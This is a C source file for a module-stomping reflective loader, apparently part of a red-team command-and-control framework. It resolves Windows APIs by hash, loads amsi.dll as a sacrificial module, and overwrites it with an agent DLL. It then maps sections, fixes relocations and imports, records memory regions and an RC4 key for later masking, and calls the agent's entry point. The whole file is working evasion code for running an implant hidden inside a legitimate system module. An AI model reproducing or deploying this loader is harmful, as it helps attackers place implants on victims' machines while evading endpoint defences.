#include <Common.h>
#include <Constexpr.h>
#include <UserData.h>

/*
 * loader-stomp: Module-stomping reflective loader for Starburst UDRL-VS.
 *
 * Loads the agent DLL by stomping over a legitimate system DLL's .text
 * section rather than allocating fresh executable memory. Copy this file
 * into loader/src/Main.c to replace the base loader.
 */

#ifndef STOMP_DLL
#define STOMP_DLL  L"amsi.dll"
#endif

/* PE section characteristics to memory protection */
FUNC static DWORD SectionToProtect( DWORD ch ) {
    BOOL x = !!( ch & IMAGE_SCN_MEM_EXECUTE );
    BOOL r = !!( ch & IMAGE_SCN_MEM_READ    );
    BOOL w = !!( ch & IMAGE_SCN_MEM_WRITE   );

    if ( x && w && r ) return PAGE_EXECUTE_READWRITE;
    if ( x && r      ) return PAGE_EXECUTE_READ;
    if ( x && w      ) return PAGE_EXECUTE_WRITECOPY;
    if ( x           ) return PAGE_EXECUTE;
    if ( w && r      ) return PAGE_READWRITE;
    if ( r           ) return PAGE_READONLY;
    if ( w           ) return PAGE_WRITECOPY;
    return PAGE_NOACCESS;
}

/* Find the first executable code section in a loaded module */
FUNC static BOOL FindTextSection( PBYTE Base, PVOID *Addr, PDWORD Size ) {
    PIMAGE_DOS_HEADER Dos = C_PTR( Base );
    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE ) return FALSE;

    PIMAGE_NT_HEADERS Nt = C_PTR( Base + Dos->e_lfanew );
    if ( Nt->Signature != IMAGE_NT_SIGNATURE ) return FALSE;

    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION( Nt );
    for ( WORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
        if ( ( Sec[i].Characteristics & IMAGE_SCN_CNT_CODE ) &&
             ( Sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            *Addr = Base + Sec[i].VirtualAddress;
            *Size = Sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/* Generate pseudo-random RC4 key from RDTSC */
FUNC static VOID GenerateRc4Key( PBYTE Key ) {
    for ( int i = 0; i < 16; i += 4 ) {
        DWORD tick;
#ifdef _WIN64
        tick = (DWORD)__rdtsc();
#else
        tick = (DWORD)__rdtsc();
#endif
        Key[i]     = (BYTE)( tick );
        Key[i + 1] = (BYTE)( tick >> 8 );
        Key[i + 2] = (BYTE)( tick >> 16 );
        Key[i + 3] = (BYTE)( tick >> 24 );
        for ( volatile int j = 0; j < 100; j++ ) {}
    }
}

/*
 * Main - Module-stomping reflective loader entry point.
 *
 * Param: length-prefixed DLL payload, or NULL to use StRipEnd().
 */
FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    /* ── Resolve APIs ── */

    if ( ! ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) )
        return;
    if ( ! ( Instance()->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) )
        return;

    Instance()->Win32.LoadLibraryA           = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA"           ) );
    Instance()->Win32.LoadLibraryExW         = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW"         ) );
    Instance()->Win32.GetProcAddress          = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress"          ) );
    Instance()->Win32.VirtualAlloc            = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc"            ) );
    Instance()->Win32.VirtualProtect          = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect"          ) );
    Instance()->Win32.NtFlushInstructionCache = LdrFunction( Instance()->Modules.Ntdll,    HASH_STR( "NtFlushInstructionCache" ) );

    if ( ! Instance()->Win32.LoadLibraryA    || ! Instance()->Win32.GetProcAddress ||
         ! Instance()->Win32.VirtualAlloc    || ! Instance()->Win32.VirtualProtect ||
         ! Instance()->Win32.LoadLibraryExW  || ! Instance()->Win32.NtFlushInstructionCache )
        return;

    /* ── Locate DLL payload ── */

    PBYTE DllRaw   = NULL;
    DWORD DllSize  = 0;

    if ( Param ) {
        DllSize = *(PDWORD) Param;
        DllRaw  = (PBYTE) Param + 4;
    } else {
        PBYTE End = (PBYTE) StRipEnd();
        DllSize = *(PDWORD) End;
        DllRaw  = End + 4;
    }

    if ( ! DllRaw || DllSize < sizeof(IMAGE_DOS_HEADER) )
        return;

    /* ── Parse PE headers ── */

    PIMAGE_DOS_HEADER Dos = C_PTR( DllRaw );
    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE )
        return;

    PIMAGE_NT_HEADERS Nt = C_PTR( DllRaw + Dos->e_lfanew );
    if ( Nt->Signature != IMAGE_NT_SIGNATURE )
        return;

    DWORD     ImageSize     = Nt->OptionalHeader.SizeOfImage;
    DWORD     HeadersSize   = Nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG PreferredBase = Nt->OptionalHeader.ImageBase;
    WORD      NumSections   = Nt->FileHeader.NumberOfSections;

    PIMAGE_SECTION_HEADER Sections = IMAGE_FIRST_SECTION( Nt );

    /* ── Load sacrificial DLL and stomp its .text ── */

    HMODULE StompedModule = Instance()->Win32.LoadLibraryExW(
        STOMP_DLL, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( ! StompedModule ) return;

    PVOID StompedText   = NULL;
    DWORD StompedTextSz = 0;

    if ( ! FindTextSection( (PBYTE)StompedModule, &StompedText, &StompedTextSz ) )
        return;
    if ( StompedTextSz < ImageSize )
        return;

    PBYTE MappedBase = (PBYTE) StompedModule;

    /* Make the stomped region writable for mapping */
    DWORD OldProt;
    Instance()->Win32.VirtualProtect( MappedBase, ImageSize, PAGE_READWRITE, &OldProt );

    /* ── Map PE sections ── */

    MmCopy( MappedBase, DllRaw, HeadersSize );

    for ( WORD i = 0; i < NumSections; i++ ) {
        if ( Sections[i].SizeOfRawData == 0 )
            continue;
        MmCopy(
            MappedBase + Sections[i].VirtualAddress,
            DllRaw     + Sections[i].PointerToRawData,
            Sections[i].SizeOfRawData
        );
    }

    /* Refresh header pointers to mapped copy */
    Dos = C_PTR( MappedBase );
    Nt  = C_PTR( MappedBase + Dos->e_lfanew );

    /* ── Process relocations ── */

    LONGLONG Delta = (LONGLONG)( (ULONGLONG)MappedBase - PreferredBase );

    if ( Delta != 0 ) {
        DWORD RelocRva  = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].VirtualAddress;
        DWORD RelocSize = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].Size;

        if ( RelocRva && RelocSize ) {
            PIMAGE_BASE_RELOCATION Reloc = C_PTR( MappedBase + RelocRva );
            PBYTE RelocEnd = (PBYTE)Reloc + RelocSize;

            while ( (PBYTE)Reloc < RelocEnd && Reloc->SizeOfBlock ) {
                DWORD Count = ( Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof(WORD);
                PWORD Entries = (PWORD)( (PBYTE)Reloc + sizeof(IMAGE_BASE_RELOCATION) );

                for ( DWORD i = 0; i < Count; i++ ) {
                    WORD Type   = Entries[i] >> 12;
                    WORD Offset = Entries[i] & 0xFFF;
                    PBYTE Patch = MappedBase + Reloc->VirtualAddress + Offset;

                    switch ( Type ) {
                        case IMAGE_REL_BASED_DIR64:
                            *(PULONGLONG)Patch += Delta;
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(PDWORD)Patch += (DWORD)Delta;
                            break;
                        case IMAGE_REL_BASED_HIGH:
                            *(PWORD)Patch += (WORD)( Delta >> 16 );
                            break;
                        case IMAGE_REL_BASED_LOW:
                            *(PWORD)Patch += (WORD)Delta;
                            break;
                        case IMAGE_REL_BASED_ABSOLUTE:
                            break;
                    }
                }
                Reloc = C_PTR( (PBYTE)Reloc + Reloc->SizeOfBlock );
            }
        }
    }

    /* ── Resolve imports ── */

    DWORD ImportRva = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;

    if ( ImportRva ) {
        PIMAGE_IMPORT_DESCRIPTOR Imp = C_PTR( MappedBase + ImportRva );

        while ( Imp->Name ) {
            PCHAR ModName = C_PTR( MappedBase + Imp->Name );
            HMODULE hMod  = Instance()->Win32.LoadLibraryA( ModName );

            if ( ! hMod ) { Imp++; continue; }

            PIMAGE_THUNK_DATA OrigThunk = C_PTR(
                MappedBase + ( Imp->OriginalFirstThunk ? Imp->OriginalFirstThunk : Imp->FirstThunk ) );
            PIMAGE_THUNK_DATA IatThunk  = C_PTR( MappedBase + Imp->FirstThunk );

            while ( OrigThunk->u1.AddressOfData ) {
                FARPROC Func = NULL;

#ifdef _WIN64
                if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64 )
                    Func = Instance()->Win32.GetProcAddress( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
#else
                if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 )
                    Func = Instance()->Win32.GetProcAddress( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
#endif
                else {
                    PIMAGE_IMPORT_BY_NAME ImpName = C_PTR( MappedBase + OrigThunk->u1.AddressOfData );
                    Func = Instance()->Win32.GetProcAddress( hMod, ImpName->Name );
                }

                IatThunk->u1.Function = (ULONGLONG)Func;
                OrigThunk++;
                IatThunk++;
            }
            Imp++;
        }
    }

    /* ── Set section protections ── */

    Sections = IMAGE_FIRST_SECTION( Nt );
    for ( WORD i = 0; i < NumSections; i++ ) {
        if ( Sections[i].Misc.VirtualSize == 0 )
            continue;
        DWORD Prot = SectionToProtect( Sections[i].Characteristics );
        DWORD Old;
        Instance()->Win32.VirtualProtect(
            MappedBase + Sections[i].VirtualAddress,
            Sections[i].Misc.VirtualSize,
            Prot, &Old );
    }

    { DWORD Old; Instance()->Win32.VirtualProtect( MappedBase, HeadersSize, PAGE_READONLY, &Old ); }

    /* ── Flush instruction cache ── */

    Instance()->Win32.NtFlushInstructionCache( (HANDLE)-1, MappedBase, ImageSize );

    /* ── Populate UDRL_USER_DATA ── */

    UDRL_USER_DATA *Ud = Instance()->Win32.VirtualAlloc(
        NULL, sizeof(UDRL_USER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( Ud ) {
        MmZero( Ud, sizeof(UDRL_USER_DATA) );
        Ud->magic = UDRL_MAGIC;

        Ud->load_type         = LOAD_TYPE_MODULE_STOMP;
        Ud->agent_base        = MappedBase;
        Ud->agent_size        = ImageSize;
        Ud->loader_base       = Instance()->Base.Buffer;
        Ud->loader_size       = Instance()->Base.Length;
        Ud->stomped_module    = StompedModule;
        Ud->stomped_text_base = StompedText;
        Ud->stomped_text_size = StompedTextSz;

        /* Region 0: stomped .text that holds the mapped agent image */
        Ud->regions[0].base    = StompedText;
        Ud->regions[0].size    = StompedTextSz;
        Ud->regions[0].protect = PAGE_EXECUTE_READ;

        /* Region 1: this user data allocation */
        Ud->regions[1].base    = Ud;
        Ud->regions[1].size    = sizeof(UDRL_USER_DATA);
        Ud->regions[1].protect = PAGE_READWRITE;

        Ud->region_count = 2;

        GenerateRc4Key( Ud->rc4_key );
    }

    /* ── Call DllMain ── */

    typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );

    DWORD EntryRva = Nt->OptionalHeader.AddressOfEntryPoint;
    if ( EntryRva ) {
        fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
        pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, (LPVOID)Ud );
    }
}
